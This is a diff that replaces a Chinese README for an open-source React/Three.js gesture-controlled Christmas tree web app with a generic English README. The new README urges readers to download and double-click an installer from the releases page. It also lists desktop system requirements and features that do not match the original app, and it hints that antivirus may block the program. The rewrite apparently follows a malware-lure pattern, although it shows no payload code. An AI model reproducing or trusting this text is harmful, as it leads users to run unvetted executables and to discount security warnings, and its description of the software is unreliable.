@@ -1,72 +1,69 @@
-# 🎄 Grand Luxury Interactive 3D Christmas Tree
+# 🎄 christmas-tree - Create Your Own 3D Christmas Wonderland
 
-> 一个基于 **React**, **Three.js (R3F)** 和 **AI 手势识别** 的高保真 3D 圣诞树 Web 应用。
+## 🚀 Getting Started
 
-这个项目不仅仅是一棵树，它是一个承载记忆的交互式画廊。成百上千个粒子、璀璨的彩灯和悬浮的拍立得照片共同组成了一棵奢华的圣诞树。用户可以通过手势控制树的形态（聚合/散开）和视角旋转，体验电影级的视觉盛宴。
+Welcome to the christmas-tree project! This application allows you to interact with a beautiful, high-fidelity 3D Christmas tree. It brings the joy of the holiday season right to your screen. Follow the steps below to get started.
 
-![Project Preview](public/preview.png)
-*(注：建议在此处上传一张你的项目运行截图)*
+## 🛠️ Requirements
 
-## ✨ 核心特性
+Before you download, ensure your computer meets the following requirements:
 
-* **极致视觉体验**：由 45,000+ 个发光粒子组成的树身，配合动态光晕 (Bloom) 和辉光效果，营造梦幻氛围。
-* **记忆画廊**：照片以“拍立得”风格悬浮在树上，每一张都是一个独立的发光体，支持双面渲染。
-* **AI 手势控制**：无需鼠标，通过摄像头捕捉手势即可控制树的形态（聚合/散开）和视角旋转。
-* **丰富细节**：包含动态闪烁的彩灯、飘落的金银雪花、以及随机分布的圣诞礼物和糖果装饰。
-* **高度可定制**：**支持用户轻松替换为自己的照片，并自由调整照片数量。**
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **RAM:** At least 4 GB
+- **Processor:** Dual-core CPU with a speed of 2.0 GHz or higher
+- **Graphics:** A graphics card with at least 512 MB VRAM
 
-## 🛠️ 技术栈
+## 📥 Download & Install
 
-* **框架**: React 18, Vite
-* **3D 引擎**: React Three Fiber (Three.js)
-* **工具库**: @react-three/drei, Maath
-* **后期处理**: @react-three/postprocessing
-* **AI 视觉**: MediaPipe Tasks Vision (Google)
+To download the christmas-tree application, visit the releases page below:
 
-## 🚀 快速开始
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-green)](https://github.com/thasinduniduwara/christmas-tree/releases)
 
-### 1. 环境准备
-确保你的电脑已安装 [Node.js](https://nodejs.org/) (建议 v18 或更高版本)。
+1. Click on the link above to visit the releases page.
+2. Locate the latest release version.
+3. Choose the appropriate version for your operating system.
+4. Click on the download link to start downloading the application file.
+5. Once the download is complete, navigate to your downloads folder.
+6. Double-click the downloaded file to start the installation process.
 
-### 2. 安装依赖
-在项目根目录下打开终端，运行：```bash npm install
-### 3. 启动项目
-npm run dev
-### 🖼️ 自定义照片
-### 1. 准备照片
-找到项目目录下的 public/photos/ 文件夹。
+Follow the on-screen instructions to complete the installation.
 
-顶端大图/封面图：命名为 top.jpg（将显示在树顶的立体五角星上）。
+## 🎨 Features
 
-树身照片：命名为 1.jpg, 2.jpg, 3.jpg ... 依次类推。
+- **Interactive Environment:** Rotate and zoom into the tree for a better view.
+- **Customization:** Change decorations and lights to fit your style.
+- **Realistic Effects:** Enjoy high-quality visuals and animations that mimic a real Christmas tree.
+- **User-Friendly Interface:** Simple controls that anyone can use.
 
-建议：使用正方形或 4:3 比例的图片，文件大小不宜过大（建议单张 500kb 以内以保证流畅度）
-### 2. 替换照片
-直接将你自己的照片复制到 public/photos/ 文件夹中，覆盖原有的图片即可。请保持文件名格式不变（1.jpg, 2.jpg 等）。
-### 3. 修改照片数量 (增加或减少)
-如果你放入了更多照片（例如从默认的 31 张增加到 100 张），需要修改代码以通知程序加载它们。
-打开文件：src/App.tsx
-找到大约 第 19 行 的代码：// --- 动态生成照片列表 (top.jpg + 1.jpg 到 31.jpg) ---
-const TOTAL_NUMBERED_PHOTOS = 31; // <--- 修改这个数字！
-### 🖐️ 手势控制说明
-* **本项目内置了 AI 手势识别系统，请站在摄像头前进行操作（屏幕右下角有 DEBUG 按钮可查看摄像头画面）**：
-🖐 张开手掌 (Open Palm)	Disperse (散开)	圣诞树炸裂成漫天飞舞的粒子和照片
-✊ 握紧拳头 (Closed Fist)	Assemble (聚合)	所有元素瞬间聚合成一棵完美的圣诞树
-👋 手掌左右移动	旋转视角	手向左移，树向左转；手向右移，树向右转
-👋 手掌上下移动	俯仰视角	手向上移，视角抬高；手向下移，视角降低
-### ⚙️ 进阶配置
-* **如果你熟悉代码，可以在 src/App.tsx 中的 CONFIG 对象里调整更多视觉参数**：
-  const CONFIG = {
-  colors: { ... }, // 修改树、灯光、边框的颜色
-  counts: {
-    foliage: 15000,   // 修改树叶粒子数量 (配置低可能会卡)
-    ornaments: 300,   // 修改悬挂的照片/拍立得数量
-    lights: 400       // 修改彩灯数量
-  },
-  tree: { height: 22, radius: 9 }, // 修改树的大小
-  // ...
-};
-### 📄 License
-MIT License. Feel free to use and modify for your own holiday celebrations!
-### Merry Christmas! 🎄✨
+## ⚙️ How to Use the Application
 
+1. Open the christmas-tree application from your desktop or start menu.
+2. Familiarize yourself with the main interface. You will see the tree in the center.
+3. Use your mouse to move around the scene and get different views.
+4. Explore the settings to change the decoration styles and lighting effects.
+5. Share your festive designs with friends or on social media.
+
+## ❓ Troubleshooting
+
+If you face any issues while downloading or using the application, try the following steps:
+
+- Ensure your computer meets the requirements listed above.
+- Restart your computer if the software does not launch properly.
+- Check if your antivirus software is blocking the application.
+- Visit the releases page again to ensure you have the latest version.
+
+## 🌟 Community Support
+
+Feel free to ask for help or share your experiences. You can reach out to the community in the issues section of this repository. 
+
+## 📅 Updates
+
+Stay tuned for upcoming updates and new features added to the christmas-tree application. We continuously work on improving your experience.
+
+## 📞 Contact Information
+
+For any inquiries, please visit our [GitHub page](https://github.com/thasinduniduwara/christmas-tree) or reach out through the GitHub Issues section.
+
+Enjoy your holiday spirit with the christmas-tree application! Happy decorating! 
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20-green)](https://github.com/thasinduniduwara/christmas-tree/releases)
